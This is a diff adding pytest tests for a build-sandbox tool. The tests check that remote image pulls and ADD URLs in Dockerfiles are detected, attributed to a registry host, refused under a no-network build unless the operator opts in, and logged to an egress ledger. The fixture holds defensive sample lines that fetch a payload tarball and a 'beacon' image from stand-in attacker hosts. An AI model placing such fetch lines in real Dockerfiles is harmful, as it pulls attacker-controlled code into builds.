@@ -763,3 +763,89 @@ def test_service_exec_refuses_without_a_recorded_project(monkeypatch):
     running = RunningTarget("http://web:10001", stop=lambda: None, network="net")
     with pytest.raises(rt.DockerError, match="service containers"):
         runtime.service_exec(running, ["echo", "hi"])
+
+
+# --- IMPROVEMENT-PLAN item 2 (still open part): fetches outside network: none -------
+
+def test_dockerfile_fetches_finds_images_and_urls_outside_run_steps():
+    text = (
+        "# syntax=docker/dockerfile:1\n"
+        "ARG BASE=python:3.12-slim\n"
+        "FROM --platform=linux/amd64 ${BASE} AS build\n"
+        "COPY --from=ghcr.io/astral-sh/uv:0.5 /uv /bin/uv\n"
+        "RUN --mount=type=cache,from=build,target=/c true\n"
+        "ADD https://evil.example/payload.tgz /tmp/\n"
+        "ADD \"https://quoted.example/v${BASE}.tgz\" /opt/a.tgz\n"
+        "ADD [\"git@gitlab.example:org/repo.git\", \"/src\"]\n"
+        "ADD --chown=1:1 ./local /app\n"
+        "FROM build\n"
+        "COPY --from=build /app /app\n"
+        "FROM scratch\n"
+        "FROM attacker.example:5000/beacon:latest \\\n"
+        "    AS final\n")
+    got = {(f["kind"], f["ref"], f["host"]) for f in rt.dockerfile_fetches(text)}
+    assert got == {
+        ("image", "python:3.12-slim", "docker.io"),
+        ("image", "ghcr.io/astral-sh/uv:0.5", "ghcr.io"),
+        ("add-url", "https://evil.example/payload.tgz", "evil.example"),
+        ("add-url", "https://quoted.example/vpython:3.12-slim.tgz", "quoted.example"),
+        ("add-url", "git@gitlab.example:org/repo.git", "gitlab.example"),
+        ("image", "attacker.example:5000/beacon:latest", "attacker.example:5000"),
+    }
+
+
+def test_registry_of_follows_dockers_rule():
+    assert rt.registry_of("postgres:16") == "docker.io"
+    assert rt.registry_of("library/redis") == "docker.io"
+    assert rt.registry_of("ghcr.io/o/r:1") == "ghcr.io"
+    assert rt.registry_of("localhost/x") == "localhost"
+    assert rt.registry_of("reg.example:5000/x") == "reg.example:5000"
+
+
+def test_fetches_from_a_target_chosen_host_are_refused_unless_opted_in():
+    ok = [{"kind": "image", "ref": "postgres:16", "host": "docker.io", "service": "db"}]
+    rt.check_remote_fetches(ok, "none")
+    for bad in ({"kind": "image", "ref": "x.example/y", "host": "x.example", "service": "a"},
+                {"kind": "add-url", "ref": "https://ghcr.io/f", "host": "ghcr.io",
+                 "service": "a"},
+                {"kind": "image", "ref": "${UNSET}", "host": "?", "service": "a"}):
+        with pytest.raises(rt.ProvisioningGap, match="--build-network"):
+            rt.check_remote_fetches(ok + [bad], "none")
+        rt.check_remote_fetches(ok + [bad], "default")     # the operator's opt-in
+
+
+def test_prepare_lists_every_fetch_and_refuses_an_add_url(tmp_path, monkeypatch):
+    src = tmp_path / "src"
+    src.mkdir()
+    (src / "Dockerfile").write_text("FROM python:3.12\nADD https://x.example/a /a\n")
+    (src / "docker-compose.yml").write_text(
+        "services:\n  web:\n    build: .\n    ports: ['8000:8000']\n"
+        "  db:\n    image: postgres:16\n")
+    monkeypatch.setattr(rt, "resolve_compose", lambda base, env_file, env, **kw: {
+        "services": {"web": {"build": {"context": str(src)}, "ports": [{"target": 8000}]},
+                     "db": {"image": "postgres:16"}}})
+    monkeypatch.setattr(rt, "_operator_docker_host", lambda: None)
+    runtime = DockerRuntime()
+    with pytest.raises(rt.ProvisioningGap, match="add-url https://x.example/a"):
+        runtime.prepare(src / "docker-compose.yml", src, tmp_path / "w")
+    refs = {(f["service"], f["ref"]) for f in runtime.provisioning["remote_fetches"]}
+    assert refs == {("web", "python:3.12"), ("web", "https://x.example/a"),
+                    ("db", "postgres:16"), ("(quarry sidecar)", rt.SIDECAR_IMAGE)}
+
+
+def test_provisioning_fetches_go_on_the_egress_ledger(tmp_path):
+    from types import SimpleNamespace
+    from quarry import db
+    from quarry.dynamic.validate import _record_provisioning
+    con = db.init(tmp_path / "t.db")
+    con.execute("INSERT INTO runs (id,target,clone_url,status) VALUES (1,'o/r','x','done')")
+    fetches = [{"kind": "image", "ref": "postgres:16", "host": "docker.io", "service": "db"},
+               {"kind": "image", "ref": rt.SIDECAR_IMAGE, "host": "docker.io",
+                "service": "(quarry sidecar)"},
+               {"kind": "image", "ref": "ghcr.io/o/r", "host": "ghcr.io", "service": "web"}]
+    _record_provisioning(con, 1, SimpleNamespace(provisioning={
+        "build_network": "none", "remote_fetches": fetches}))
+    rows = {r["destination"]: r["note"] for r in con.execute(
+        "SELECT destination, note FROM egress WHERE run_id=1 AND stage='validate-provision'")}
+    assert set(rows) == {"docker.io", "ghcr.io"}
+    assert rows["docker.io"].startswith("2 image or ADD fetch(es)")
